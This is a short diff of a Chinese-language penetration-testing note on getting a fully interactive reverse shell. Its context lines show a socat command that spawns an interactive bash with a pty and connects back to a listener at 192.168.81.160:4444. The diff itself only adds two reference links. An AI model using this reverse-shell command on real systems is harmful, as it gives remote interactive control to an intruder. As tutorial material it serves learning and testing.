@@ -44,3 +44,7 @@ chmod u+x /tmp/socat
 /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.81.160:4444
 此时拿到的shell可以执行删除、可以选择历史命令、可以执行ctlr-c
 ```
+
+# 参考连接
+https://www.freebuf.com/vuls/211847.html  
+https://saucer-man.com/information_security/233.html#cl-1  
